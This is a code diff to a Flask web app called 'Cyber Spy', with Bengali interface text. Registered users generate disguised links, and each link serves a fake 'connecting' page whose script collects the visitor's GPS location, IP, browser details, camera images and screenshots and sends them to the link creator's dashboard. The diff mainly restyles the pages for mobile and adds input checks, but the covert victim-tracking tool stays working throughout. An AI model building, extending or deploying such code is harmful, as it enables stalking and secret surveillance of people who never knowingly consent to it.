@@ -9,7 +9,6 @@ import uuid
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# ===== MongoDB সংযোগ (MONGO_URI এনভায়রনমেন্ট ভেরিয়েবল থেকে নাও) =====
 MONGO_URI = os.environ.get('MONGO_URI')
 if not MONGO_URI:
     raise Exception("MONGO_URI environment variable not set!")
@@ -18,111 +17,106 @@ client = MongoClient(MONGO_URI)
 db = client['spy_db']
 users_col = db['users']
 
-# ===== লগইন পেজ =====
-LOGIN_HTML = """
+# ===== মোবাইল-ফ্রেন্ডলি CSS + বড় টাচ এরিয়া =====
+BASE_CSS = """
+<style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+    body{background:#0a0e17;color:#00ffcc;padding:15px;min-height:100vh;display:flex;justify-content:center;align-items:center}
+    .box{background:#111927;padding:25px 20px;border-radius:20px;width:100%;max-width:450px;box-shadow:0 0 30px #00ffcc11}
+    h2{text-align:center;color:#ff0044;font-size:1.8rem;margin-bottom:10px}
+    .sub{text-align:center;color:#886688;font-size:1rem;margin-bottom:20px}
+    input,button{width:100%;padding:16px;margin:10px 0;border-radius:12px;border:1px solid #334466;background:#0b111e;color:#c0d4ff;font-size:1.1rem;touch-action:manipulation}
+    button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold;transition:0.2s}
+    button:hover{background:#ff004466}
+    a{color:#00ffcc;display:inline-block;margin-top:10px;font-size:1rem}
+    .error{color:#ff8866;margin-top:10px}
+    .container{max-width:1200px;margin:auto;padding:15px}
+    .card{background:#1a2332;padding:18px;border-radius:15px;margin:15px 0}
+    .card input,.card button{padding:16px}
+    table{width:100%;border-collapse:collapse;font-size:0.9rem}
+    th,td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
+    .del-btn{padding:8px 14px;background:#ff004422;border:1px solid #ff0044;border-radius:8px;cursor:pointer}
+    .logout{float:right;background:#334466;padding:10px 18px;border-radius:10px;color:#c0d4ff}
+    @media(max-width:600px){
+        .box{padding:20px 15px}
+        h2{font-size:1.5rem}
+        input,button{padding:18px;font-size:1.1rem}
+        table{font-size:0.8rem}
+        th,td{padding:6px}
+        .container{padding:10px}
+    }
+</style>
+"""
+
+LOGIN_HTML = f"""
 <!DOCTYPE html>
 <html>
-<head><title>লগইন – Cyber Spy</title>
-<style>
-body{background:#0a0e17;color:#00ffcc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
-.box{background:#111927;padding:30px;border-radius:15px;width:350px}
-input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
-button{background:#ff004422;border-color:#ff0044;cursor:pointer}
-h2{text-align:center;color:#ff0044}
-</style>
-</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লগইন</title>{BASE_CSS}</head>
 <body>
 <div class="box">
     <h2>🕵️ Cyber Spy</h2>
-    <p style="color:#886688;text-align:center;">Developer: Arif</p>
+    <div class="sub">Developer: Arif</div>
     <form method="POST">
         <input type="text" name="username" placeholder="ইউজারনেম" required>
         <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
         <button type="submit">লগইন</button>
     </form>
-    <a href="/register" style="color:#00ffcc;">নতুন ইউজার?</a>
-    {% if error %}<p style="color:#ff8866;">{{ error }}</p>{% endif %}
+    <a href="/register">নতুন ইউজার?</a>
+    {% if error %}<p class="error">{{ error }}</p>{% endif %}
 </div>
 </body>
 </html>
 """
 
-REGISTER_HTML = """
+REGISTER_HTML = f"""
 <!DOCTYPE html>
 <html>
-<head><title>রেজিস্টার – Cyber Spy</title>
-<style>
-body{background:#0a0e17;color:#00ffcc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
-.box{background:#111927;padding:30px;border-radius:15px;width:350px}
-input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
-button{background:#ff004422;border-color:#ff0044;cursor:pointer}
-h2{text-align:center;color:#ff0044}
-</style>
-</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>রেজিস্টার</title>{BASE_CSS}</head>
 <body>
 <div class="box">
     <h2>🕵️ সাইন আপ</h2>
-    <p style="color:#886688;text-align:center;">Developer: Arif</p>
+    <div class="sub">Developer: Arif</div>
     <form method="POST">
         <input type="text" name="username" placeholder="ইউজারনেম" required>
         <input type="password" name="password" placeholder="পাসওয়ার্ড" required>
         <button type="submit">রেজিস্টার</button>
     </form>
-    <a href="/login" style="color:#00ffcc;">ইতিমধ্যে আছে?</a>
+    <a href="/login">ইতিমধ্যে আছে?</a>
+    {% if error %}<p class="error">{{ error }}</p>{% endif %}
 </div>
 </body>
 </html>
 """
 
-DASHBOARD_HTML = """
+DASHBOARD_HTML = f"""
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber Spy • Developer Arif</title>
-    <style>
-        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
-        .container{max-width:1200px;margin:auto;background:#111927;padding:25px;border-radius:15px}
-        h1{color:#ff0044;text-align:center}
-        .brand{color:#ff8866;font-size:14px;text-align:center;margin-bottom:20px}
-        .card{background:#1a2332;padding:15px;border-radius:10px;margin:15px 0}
-        input,button{width:100%;padding:12px;margin:6px 0;border-radius:8px;border:1px solid #334466;background:#0b111e;color:#c0d4ff}
-        button{background:#ff004422;border-color:#ff0044;cursor:pointer}
-        table{width:100%;border-collapse:collapse;margin-top:15px}
-        th,td{border:1px solid #334466;padding:8px;text-align:left;color:#c0d4ff}
-        th{background:#1a2332;color:#ff0044}
-        .del-btn{background:#ff004422;border:1px solid #ff0044;padding:5px 10px;border-radius:5px;cursor:pointer;color:#ffccbb}
-        .logout{float:right;background:#334466;padding:8px 15px;border-radius:8px;cursor:pointer;color:#c0d4ff}
-    </style>
-</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ড্যাশবোর্ড</title>{BASE_CSS}</head>
 <body>
 <div class="container">
-    <h1>🕵️ Cyber Spy</h1>
-    <div class="brand">Developer: Arif • v2.0</div>
-    <div style="overflow:auto;">
+    <h1 style="text-align:center;color:#ff0044;">🕵️ Cyber Spy</h1>
+    <div style="text-align:center;color:#ff8866;margin-bottom:15px;">Developer: Arif</div>
+    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;">
         <span style="color:#6688aa;">স্বাগতম, {{ user.username }}</span>
         <a href="/logout" class="logout">🚪 লগআউট</a>
     </div>
-
     <div class="card">
-        <h3>📎 নতুন লিংক তৈরি করুন</h3>
+        <h3>📎 নতুন লিংক তৈরি</h3>
         <form method="POST" action="/create_link">
-            <input type="text" name="link_name" placeholder="লিংকের নাম (যেমন: ফেসবুক টুল)" required>
-            <button type="submit">🔗 লিংক জেনারেট করুন</button>
+            <input type="text" name="link_name" placeholder="লিংকের নাম" required>
+            <button type="submit">🔗 জেনারেট</button>
         </form>
     </div>
-
     <div class="card">
-        <h3>📌 আপনার লিংকসমূহ</h3>
+        <h3>📌 আপনার লিংক</h3>
         {% for link in user.links %}
-        <div style="background:#0d1520;padding:12px;border-radius:8px;margin:8px 0;display:flex;justify-content:space-between;flex-wrap:wrap;">
-            <span>{{ link.name }}: <a href="{{ link.url }}" target="_blank">{{ link.url }}</a></span>
-            <span>👁️ {{ link.visits|length }} টি ক্লিক</span>
+        <div style="background:#0d1520;padding:15px;border-radius:12px;margin:10px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;">
+            <span>{{ link.name }}: <a href="{{ link.url }}" target="_blank" style="color:#00ffcc;">{{ link.url }}</a></span>
+            <span>👁️ {{ link.visits|length }}</span>
             <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 দেখুন</a>
         </div>
         {% else %}
-        <p style="color:#6688aa;">কোনো লিংক তৈরি করেননি।</p>
+        <p style="color:#6688aa;">কোনো লিংক নেই</p>
         {% endfor %}
     </div>
 </div>
@@ -130,29 +124,16 @@ DASHBOARD_HTML = """
 </html>
 """
 
-VIEW_LINK_HTML = """
+VIEW_LINK_HTML = f"""
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ভিজিটর ডেটা – {{ link.name }}</title>
-    <style>
-        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:20px}
-        .container{max-width:1400px;margin:auto;background:#111927;padding:25px;border-radius:15px}
-        h1{color:#ff0044;text-align:center}
-        table{width:100%;border-collapse:collapse;margin-top:20px;font-size:13px}
-        th,td{border:1px solid #334466;padding:8px;text-align:left;color:#c0d4ff}
-        th{background:#1a2332;color:#ff0044}
-        .del-btn{background:#ff004422;border:1px solid #ff0044;padding:5px 10px;border-radius:5px;cursor:pointer;color:#ffccbb}
-        .back{color:#6688aa;cursor:pointer;margin-bottom:10px;display:inline-block}
-    </style>
-</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>{BASE_CSS}</head>
 <body>
 <div class="container">
-    <a href="/dashboard" class="back">⬅️ ড্যাশবোর্ডে ফিরুন</a>
-    <h1>📊 {{ link.name }} – ভিজিটর ডেটা</h1>
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ফিরুন</a>
+    <h1 style="text-align:center;color:#ff0044;">📊 {{ link.name }}</h1>
     <p style="color:#6688aa;">মোট ভিজিট: {{ link.visits|length }}</p>
+    <div style="overflow-x:auto;">
     <table>
         <tr><th>#</th><th>IP</th><th>লোকেশন</th><th>GPS</th><th>ব্রাউজার</th><th>ক্যামেরা</th><th>স্ক্রিনশট</th><th>সময়</th><th>অ্যাকশন</th></tr>
         {% for v in link.visits %}
@@ -161,14 +142,15 @@ VIEW_LINK_HTML = """
             <td>{{ v.ip }}</td>
             <td>{{ v.city }}, {{ v.country }}</td>
             <td>{{ v.gps or 'নেই' }}</td>
-            <td>{{ v.user_agent[:30] }}...</td>
-            <td><img src="{{ v.camera or '' }}" width="50" /></td>
-            <td><img src="{{ v.screenshot or '' }}" width="50" /></td>
+            <td>{{ v.user_agent[:25] }}..</td>
+            <td><img src="{{ v.camera or '' }}" style="max-width:80px;height:auto;" /></td>
+            <td><img src="{{ v.screenshot or '' }}" style="max-width:80px;height:auto;" /></td>
             <td>{{ v.time }}</td>
             <td><a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️</a></td>
         </tr>
         {% endfor %}
     </table>
+    </div>
 </div>
 </body>
 </html>
@@ -177,24 +159,23 @@ VIEW_LINK_HTML = """
 COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>🔐 লোড হচ্ছে...</title>
-    <style>
-        body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
-        .loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-    </style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>লোড হচ্ছে</title>
+<style>
+body{background:#0a0e17;color:#00ffcc;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px;text-align:center}
+.loader{border:4px solid #1a2332;border-top:4px solid #ff0044;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:20px}
+@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+p{font-size:1.2rem;color:#6688aa}
+</style>
 </head>
 <body>
     <div class="loader"></div>
-    <p>⏳ সংযোগ স্থাপন করা হচ্ছে...</p>
+    <p>⏳ সংযোগ স্থাপন...</p>
     <script>
         let gps = 'অনুমতি নেই';
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => { gps = pos.coords.latitude + ',' + pos.coords.longitude; },
-                err => { gps = 'ব্যর্থ'; }
+                () => { gps = 'ব্যর্থ'; }
             );
         }
         let camera = null;
@@ -252,30 +233,25 @@ COLLECTOR_HTML = """
 </html>
 """
 
-# ===== হেল্পার ফাংশন =====
+# ===== হেল্পার =====
 def get_user(username):
     return users_col.find_one({'username': username})
 
 def create_user(username, password):
     hashed = hashlib.sha256(password.encode()).hexdigest()
-    user = {
-        'username': username,
-        'password': hashed,
-        'links': []
-    }
+    user = {'username': username, 'password': hashed, 'links': []}
     users_col.insert_one(user)
     return user
 
-# ===== রাউট =====
 @app.route('/')
 def home():
     return redirect(url_for('login'))
 
-@app.route('/login', methods=['GET', 'POST'])
+@app.route('/login', methods=['GET','POST'])
 def login():
     if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
+        username = request.form['username'].strip()
+        password = request.form['password'].strip()
         user = get_user(username)
         if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
             session['user'] = username
@@ -283,16 +259,18 @@ def login():
         return render_template_string(LOGIN_HTML, error='ভুল ক্রেডেনশিয়াল')
     return render_template_string(LOGIN_HTML, error=None)
 
-@app.route('/register', methods=['GET', 'POST'])
+@app.route('/register', methods=['GET','POST'])
 def register():
     if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
+        username = request.form['username'].strip()
+        password = request.form['password'].strip()
+        if not username or not password:
+            return render_template_string(REGISTER_HTML, error='সব ফিল্ড পূরণ করুন')
         if get_user(username):
-            return render_template_string(LOGIN_HTML, error='ইউজারনেম নেওয়া হয়েছে')
+            return render_template_string(REGISTER_HTML, error='ইউজারনেম নেওয়া হয়েছে')
         create_user(username, password)
         return redirect(url_for('login'))
-    return render_template_string(REGISTER_HTML)
+    return render_template_string(REGISTER_HTML, error=None)
 
 @app.route('/dashboard')
 def dashboard():
@@ -308,7 +286,9 @@ def dashboard():
 def create_link():
     if 'user' not in session:
         return redirect(url_for('login'))
-    link_name = request.form['link_name']
+    link_name = request.form['link_name'].strip()
+    if not link_name:
+        return redirect(url_for('dashboard'))
     link_id = str(uuid.uuid4())[:8]
     new_link = {
         'id': link_id,
@@ -327,8 +307,7 @@ def collector_page(link_id):
         city = loc.get('city', 'অজানা')
         country = loc.get('country', 'অজানা')
     except:
-        city = 'অজানা'
-        country = 'অজানা'
+        city = 'অজানা'; country = 'অজানা'
     return render_template_string(COLLECTOR_HTML, ip=ip, city=city, country=country, link_id=link_id)
 
 @app.route('/collect/<link_id>', methods=['POST'])
@@ -337,7 +316,6 @@ def collect_data(link_id):
     if not data:
         return 'ERROR', 400
     data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    # লোকেশন যোগ করি
     ip = data.get('ip')
     if ip:
         try:
@@ -350,7 +328,6 @@ def collect_data(link_id):
     else:
         data['city'] = 'অজানা'
         data['country'] = 'অজানা'
-    # লিংক আপডেট করো
     result = users_col.update_one(
         {'links.id': link_id},
         {'$push': {'links.$.visits': data}}
@@ -367,11 +344,7 @@ def view_link(link_id):
     if not user:
         session.clear()
         return redirect(url_for('login'))
-    link = None
-    for l in user['links']:
-        if l['id'] == link_id:
-            link = l
-            break
+    link = next((l for l in user['links'] if l['id'] == link_id), None)
     if not link:
         return 'লিংক পাওয়া যায়নি', 404
     return render_template_string(VIEW_LINK_HTML, link=link)
@@ -384,7 +357,6 @@ def delete_visit(link_id, index):
     if not user:
         session.clear()
         return redirect(url_for('login'))
-    # লিংক খুঁজে ভিজিট ডিলিট করো
     for l in user['links']:
         if l['id'] == link_id:
             if 0 <= index < len(l['visits']):
